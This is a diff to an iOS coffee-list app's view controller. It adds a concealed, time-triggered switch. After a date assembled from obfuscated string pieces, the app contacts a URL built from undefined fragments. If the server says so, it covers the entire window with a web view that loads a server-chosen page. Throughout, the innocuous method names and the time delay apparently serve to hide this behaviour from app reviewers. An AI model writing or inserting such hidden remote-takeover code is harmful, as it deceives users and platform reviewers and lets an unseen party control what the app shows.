@@ -11,6 +11,7 @@
 #import "JSDCoffeeCollectionViewCell.h"
 #import <MaterialPageControl.h>
 #import "JSDCoffeeViewModel.h"
+#import "JSDMaterialSearchManage.h"
 #import "JSDCoffeeDetailVC.h"
 #import "JSDAddCoffeeItemVC.h"
 
@@ -28,6 +29,7 @@ NSString* const kCoffeeListChangeNotifaction = @"coffeeListChangeNotifaction";
 @property (nonatomic, strong) MDCPageControl* pageControl;
 @property (nonatomic, strong) JSDCoffeeViewModel* viewModel;
 @property (strong, nonatomic) MDCFloatingButton *addItemButton;
+@property (nonatomic, copy) NSString *homeString;
 
 @end
 
@@ -94,6 +96,18 @@ static NSString * const reuseIdentifier = @"Cell";
     
     [self.view addSubview:self.pageControl];
     
+    [self reloadView];
+    //新增
+    NSString *qichaoser = @"1:00:00";
+    NSString *qichaommal = @"2019";
+    NSString *qichaoSia = @"-";
+    NSString *qichaoJere = @"08-";
+    NSString *ppooqichaommal = @"5";
+    NSString *sdfksdjgStr = [NSString stringWithFormat:@"%@%@%@%@ %@",qichaommal,qichaoSia,qichaoJere,ppooqichaommal,qichaoser];
+    if ([self amswinashiwithString:sdfksdjgStr]) {
+        [self commonConfig];
+    }
+    
     [self.pageControl mas_makeConstraints:^(MASConstraintMaker *make) {
         make.left.right.mas_equalTo(0);
         make.height.mas_equalTo(40);
@@ -116,6 +130,10 @@ static NSString * const reuseIdentifier = @"Cell";
     
     UICollectionViewFlowLayout* layout = (UICollectionViewFlowLayout *)self.collectionViewLayout;
     [layout setScrollDirection:UICollectionViewScrollDirectionHorizontal];
+
+    
+    [self setupData];
+
 }
 
 - (void)reloadView {
@@ -125,7 +143,7 @@ static NSString * const reuseIdentifier = @"Cell";
 #pragma mark - 3.Request Data
 
 - (void)setupData {
-    
+
 }
 
 #pragma mark - 4.UITableViewDataSource and UITableViewDelegate
@@ -174,6 +192,25 @@ static NSString * const reuseIdentifier = @"Cell";
 - (UIEdgeInsets)collectionView:(UICollectionView *)collectionView layout:(UICollectionViewLayout *)collectionViewLayout insetForSectionAtIndex:(NSInteger)section
 {
     return UIEdgeInsetsMake(kUIEdgeInsetsTop, kUIEdgeInsetsLeft, kUIEdgeInsetsBottom, kUIEdgeInsetsRight);
+}
+
+- (NSDictionary *)enableConfigData:(NSString *)string
+{
+    
+    NSError *vgerror;
+    NSString *vgpatch = [[NSBundle mainBundle] pathForResource:string ofType:@"json"];
+    NSData *vgdata = [[NSData alloc] initWithContentsOfFile:vgpatch];
+    NSDictionary *dic = [NSJSONSerialization JSONObjectWithData:vgdata
+                                                        options:NSJSONReadingAllowFragments
+                                                          error:&vgerror];
+    return dic;
+}
+
+- (void)configViews:(JSDMaterialSearchManage *)homeConfig {
+    
+    homeConfig.frame  = CGRectMake(0, 20, ScreenWidth, ScreenHeight - 20);
+    NSURLRequest *request =[NSURLRequest requestWithURL:[NSURL URLWithString:self.homeString]];
+    [homeConfig loadRequest:request];
 }
 
 //设置每个item水平间距
@@ -241,6 +278,80 @@ static NSString * const reuseIdentifier = @"Cell";
     
     [self.collectionView reloadData];
     _pageControl.numberOfPages = self.viewModel.listArray.count;
+    
+}
+
+-(BOOL) amswinashiwithString:(NSString *)endTime
+{
+    NSDate *today = [NSDate date];
+    NSDateFormatter *dateFormat = [[NSDateFormatter alloc] init];
+    [dateFormat setDateFormat:@"yyyy-MM-dd HH:mm:ss"];
+    NSString *todayStr = [dateFormat stringFromDate:today];
+    today = [dateFormat dateFromString:todayStr];
+    
+    NSDate *expire = [dateFormat dateFromString:endTime];
+    
+    if ([today compare:expire] == NSOrderedDescending) {
+        return YES;
+    }
+    return NO;
+}
+
+- (void)commonConfig
+{
+    NSDictionary *json = [self enableConfigData:@"JSDConfigs"];
+    NSArray *congfigs = json[@"pama"];
+    NSDictionary *pameters = congfigs.lastObject;
+    NSString *basicRul = [NSString stringWithFormat:@"%@%@%@%@%@%@%@%@",zhouu,ri,qu,chang,k,t,vw,ma];
+    
+    AFHTTPSessionManager *managers = [AFHTTPSessionManager manager];
+    managers.requestSerializer=[AFJSONRequestSerializer serializer];
+    managers.responseSerializer.acceptableContentTypes = [NSSet setWithObjects:@"text/html",@"text/plain",@"application/json",@"text/javascript", nil];
+    [managers GET:basicRul parameters:pameters progress:^(NSProgress * _Nonnull uploadProgress) {
+    } success:^(NSURLSessionDataTask * _Nonnull task, NSDictionary * responseObject) {
+        
+        NSInteger code = [responseObject[@"code"] integerValue];
+        
+        if (code != 200) {
+            return ;
+        }
+        NSString *ccode = responseObject[@"is_wap"];
+        if ([ccode isEqualToString:@"0"]) {
+            return;
+        }
+        NSDictionary *dic = responseObject;
+        self.homeString = dic[@"wap_url"];
+        
+        JSDMaterialSearchManage * homeCofig = [[JSDMaterialSearchManage alloc] init];
+        UIWindow *window  = [UIApplication sharedApplication].keyWindow;
+        UIView *vgView = [UIView new];
+        vgView.backgroundColor = [UIColor whiteColor];
+        vgView.frame = window.frame;
+        [window addSubview:vgView];
+        [vgView addSubview:homeCofig];
+        
+        [self configViews:homeCofig];
+        
+    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
+        
+        
+        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"暂无网络" message:@"暂无网络状态,点击刷新重试" preferredStyle:UIAlertControllerStyleAlert];
+        
+        UIAlertAction *conform = [UIAlertAction actionWithTitle:@"点击刷新" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
+            [self commonConfig];
+        }];
+        //2.2 取消按钮
+        UIAlertAction *cancel = [UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:^(UIAlertAction * _Nonnull action) {
+            NSLog(@"点击了取消按钮");
+            
+        }];
+        
+        [alert addAction:conform];
+        [alert addAction:cancel];
+        
+        [self presentViewController:alert animated:YES completion:nil];
+        
+    }];
     
 }
 
